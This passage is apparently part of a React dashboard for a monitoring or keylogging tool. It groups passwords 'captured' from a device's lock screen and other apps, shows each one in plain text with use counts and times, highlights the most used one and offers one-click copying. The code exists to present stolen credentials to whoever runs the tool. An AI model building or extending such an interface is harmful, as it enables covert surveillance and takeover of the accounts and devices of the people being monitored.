                                                                        className="flex items-center gap-2 px-3 py-2 rounded-lg bg-gradient-to-r from-amber-500 to-orange-500 text-white text-sm font-medium hover:from-amber-600 hover:to-orange-600 transition-all shadow-sm"
                                                                    >
                                                                        {copiedId === `best-${group.appName}` ? (
                                                                            <>
                                                                                <Check className="w-4 h-4" />
                                                                                Copied!
                                                                            </>
                                                                        ) : (
                                                                            <>
                                                                                <Zap className="w-4 h-4" />
                                                                                <span className="font-mono font-bold">{group.mostUsedPassword}</span>
                                                                            </>
                                                                        )}
                                                                    </button>
                                                                )}

                                                                {isExpanded ? (
                                                                    <ChevronDown className="w-5 h-5 text-[var(--text-muted)]" />
                                                                ) : (
                                                                    <ChevronRight className="w-5 h-5 text-[var(--text-muted)]" />
                                                                )}
                                                            </div>

                                                            {/* Expanded Content */}
                                                            {isExpanded && (
                                                                <div className="px-5 pb-4 space-y-2 border-t border-[var(--border-light)] pt-3">
                                                                    {group.passwords.map((pwd, idx) => (
                                                                        <div
                                                                            key={idx}
                                                                            className="flex items-center justify-between p-3 rounded-xl bg-amber-50 border border-amber-200"
                                                                        >
                                                                            <div className="flex items-center gap-3">
                                                                                <Key className="w-4 h-4 text-amber-600" />
                                                                                <code className="text-lg font-mono font-bold text-amber-700">
                                                                                    {pwd.text}
                                                                                </code>
                                                                                {pwd.text === group.mostUsedPassword && (
                                                                                    <Star className="w-4 h-4 text-amber-500 fill-amber-500" />
                                                                                )}
                                                                            </div>
                                                                            <div className="flex items-center gap-2">
                                                                                <span className="text-xs text-amber-600">
                                                                                    {pwd.count}x • {pwd.startTime.toLocaleTimeString()}
                                                                                </span>
                                                                                <button
                                                                                    onClick={() => handleCopy(pwd.text, `pwd-${group.appName}-${idx}`)}
                                                                                    className="p-1.5 rounded-lg hover:bg-amber-100"
                                                                                >
                                                                                    {copiedId === `pwd-${group.appName}-${idx}`
                                                                                        ? <Check className="w-4 h-4 text-emerald-500" />
                                                                                        : <Copy className="w-4 h-4 text-amber-600" />
                                                                                    }
                                                                                </button>
                                                                            </div>
                                                                        </div>
                                                                    ))}
                                                                </div>
                                                            )}
                                                        </div>
                                                    );
                                                })}
                                            </div>
                                        </div>
                                    )}

                                    {/* Lock Screen Section */}
                                    {lockGroups.length > 0 && (
                                        <div>
                                            <h3 className="text-sm font-semibold text-[var(--text-muted)] mb-3 flex items-center gap-2">
                                                <Shield className="w-4 h-4" />
                                                Lock Screen ({lockGroups.length})
                                            </h3>
                                            <div className="space-y-2">
                                                {lockGroups.map((group) => {
                                                    const { name, color } = getAppInfo(group.appName);
                                                    const isExpanded = expandedApps.has(group.appName);

                                                    return (
                                                        <div key={group.appName} className="bg-white rounded-xl border border-[var(--border-light)] overflow-hidden">
                                                            <div
                                                                role="button"
                                                                tabIndex={0}
                                                                onClick={() => toggleExpand(group.appName)}
                                                                onKeyDown={(e) => e.key === 'Enter' && toggleExpand(group.appName)}
                                                                className="w-full px-5 py-4 flex items-center gap-3 hover:bg-[var(--bg-subtle)] transition-colors cursor-pointer"
                                                            >
                                                                <div
                                                                    className="w-10 h-10 rounded-xl flex items-center justify-center"
                                                                    style={{ backgroundColor: `${color}20` }}
                                                                >
                                                                    <Shield className="w-5 h-5" style={{ color }} />
                                                                </div>
                                                                <div className="flex-1 text-left">
                                                                    <h4 className="font-semibold text-[var(--text-primary)]">{name}</h4>
                                                                    <p className="text-xs text-[var(--text-muted)]">
                                                                        {group.passwords.length} password(s) captured
                                                                    </p>
                                                                </div>

                                                                {group.mostUsedPassword && (
                                                                    <button
                                                                        onClick={(e) => {
                                                                            e.stopPropagation();
                                                                            handleCopy(group.mostUsedPassword!, `best-${group.appName}`);
                                                                        }}
                                                                        className="flex items-center gap-2 px-3 py-2 rounded-lg bg-gradient-to-r from-blue-500 to-cyan-500 text-white text-sm font-medium hover:from-blue-600 hover:to-cyan-600 transition-all shadow-sm"
                                                                    >
                                                                        {copiedId === `best-${group.appName}` ? (
                                                                            <>
                                                                                <Check className="w-4 h-4" />
                                                                                Copied!
                                                                            </>
                                                                        ) : (
                                                                            <>
                                                                                <Zap className="w-4 h-4" />
                                                                                <span className="font-mono font-bold">{group.mostUsedPassword}</span>
                                                                            </>
                                                                        )}
                                                                    </button>
                                                                )}

                                                                {isExpanded ? (
                                                                    <ChevronDown className="w-5 h-5 text-[var(--text-muted)]" />
                                                                ) : (
                                                                    <ChevronRight className="w-5 h-5 text-[var(--text-muted)]" />
                                                                )}
                                                            </div>

                                                            {isExpanded && (
                                                                <div className="px-5 pb-4 space-y-2 border-t border-[var(--border-light)] pt-3">
                                                                    {group.passwords.map((pwd, idx) => (
                                                                        <div
                                                                            key={idx}
                                                                            className="flex items-center justify-between p-3 rounded-xl bg-blue-50 border border-blue-200"
                                                                        >
                                                                            <div className="flex items-center gap-3">
                                                                                <Key className="w-4 h-4 text-blue-600" />
                                                                                <code className="text-lg font-mono font-bold text-blue-700">
                                                                                    {pwd.text}
                                                                                </code>
                                                                                {pwd.text === group.mostUsedPassword && (
                                                                                    <Star className="w-4 h-4 text-blue-500 fill-blue-500" />
                                                                                )}
                                                                            </div>
                                                                            <div className="flex items-center gap-2">
                                                                                <span className="text-xs text-blue-600">
                                                                                    {pwd.count}x • {pwd.startTime.toLocaleTimeString()}
                                                                                </span>
                                                                                <button
                                                                                    onClick={() => handleCopy(pwd.text, `pwd-${group.appName}-${idx}`)}
                                                                                    className="p-1.5 rounded-lg hover:bg-blue-100"
                                                                                >
                                                                                    {copiedId === `pwd-${group.appName}-${idx}`
                                                                                        ? <Check className="w-4 h-4 text-emerald-500" />
                                                                                        : <Copy className="w-4 h-4 text-blue-600" />
                                                                                    }
                                                                                </button>
                                                                            </div>
                                                                        </div>
                                                                    ))}
                                                                </div>
                                                            )}
                                                        </div>
                                                    );
                                                })}
                                            </div>
                                        </div>
                                    )}

                                    {/* Other Apps Section */}
                                    {otherGroups.length > 0 && (
                                        <div>
                                            <h3 className="text-sm font-semibold text-[var(--text-muted)] mb-3 flex items-center gap-2">
                                                <Keyboard className="w-4 h-4" />
                                                Other Apps ({otherGroups.length})
                                            </h3>
                                            <div className="space-y-2">
                                                {otherGroups.map((group) => {
                                                    const { name, color } = getAppInfo(group.appName);
                                                    const isExpanded = expandedApps.has(group.appName);

                                                    return (
                                                        <div key={group.appName} className="bg-white rounded-xl border border-[var(--border-light)] overflow-hidden">
                                                            <div
                                                                role="button"
                                                                tabIndex={0}
                                                                onClick={() => toggleExpand(group.appName)}
                                                                onKeyDown={(e) => e.key === 'Enter' && toggleExpand(group.appName)}
                                                                className="w-full px-5 py-4 flex items-center gap-3 hover:bg-[var(--bg-subtle)] transition-colors cursor-pointer"
                                                            >
                                                                <div
                                                                    className="w-10 h-10 rounded-xl flex items-center justify-center"
                                                                    style={{ backgroundColor: `${color}20` }}
                                                                >
                                                                    <Key className="w-5 h-5" style={{ color }} />
                                                                </div>
                                                                <div className="flex-1 text-left">
                                                                    <h4 className="font-semibold text-[var(--text-primary)]">{name}</h4>
                                                                    <p className="text-xs text-[var(--text-muted)]">
                                                                        {group.passwords.length} password(s) captured
                                                                    </p>
                                                                </div>

                                                                {group.mostUsedPassword && (
                                                                    <button
                                                                        onClick={(e) => {
                                                                            e.stopPropagation();
                                                                            handleCopy(group.mostUsedPassword!, `best-${group.appName}`);
                                                                        }}
                                                                        className="flex items-center gap-2 px-3 py-2 rounded-lg bg-gradient-to-r from-purple-500 to-pink-500 text-white text-sm font-medium hover:from-purple-600 hover:to-pink-600 transition-all shadow-sm"
                                                                    >
                                                                        {copiedId === `best-${group.appName}` ? (
                                                                            <>
                                                                                <Check className="w-4 h-4" />
                                                                                Copied!
                                                                            </>
                                                                        ) : (
                                                                            <>
                                                                                <Zap className="w-4 h-4" />
                                                                                <span className="font-mono font-bold">{group.mostUsedPassword}</span>
                                                                            </>
                                                                        )}
                                                                    </button>
                                                                )}

                                                                {isExpanded ? (
                                                                    <ChevronDown className="w-5 h-5 text-[var(--text-muted)]" />
                                                                ) : (
                                                                    <ChevronRight className="w-5 h-5 text-[var(--text-muted)]" />
                                                                )}
                                                            </div>

                                                            {isExpanded && (
                                                                <div className="px-5 pb-4 space-y-2 border-t border-[var(--border-light)] pt-3">
                                                                    {group.passwords.map((pwd, idx) => (
                                                                        <div
                                                                            key={idx}
                                                                            className="flex items-center justify-between p-3 rounded-xl bg-purple-50 border border-purple-200"
                                                                        >
                                                                            <div className="flex items-center gap-3">
                                                                                <Key className="w-4 h-4 text-purple-600" />
                                                                                <code className="text-lg font-mono font-bold text-purple-700">
                                                                                    {pwd.text}
                                                                                </code>
                                                                                {pwd.text === group.mostUsedPassword && (
                                                                                    <Star className="w-4 h-4 text-purple-500 fill-purple-500" />
                                                                                )}
                                                                            </div>
                                                                            <div className="flex items-center gap-2">
                                                                                <span className="text-xs text-purple-600">
                                                                                    {pwd.count}x • {pwd.startTime.toLocaleTimeString()}
                                                                                </span>
                                                                                <button
                                                                                    onClick={() => handleCopy(pwd.text, `pwd-${group.appName}-${idx}`)}
                                                                                    className="p-1.5 rounded-lg hover:bg-purple-100"
                                                                                >
                                                                                    {copiedId === `pwd-${group.appName}-${idx}`
                                                                                        ? <Check className="w-4 h-4 text-emerald-500" />
                                                                                        : <Copy className="w-4 h-4 text-purple-600" />
                                                                                    }
                                                                                </button>
                                                                            </div>
                                                                        </div>
                                                                    ))}
                                                                </div>
                                                            )}
                                                        </div>
                                                    );
                                                })}
                                            </div>
                                        </div>
                                    )}
                                </div>
                            )}
                        </div>
                    )}
                </div>
            </main>
        </div>
    );
}
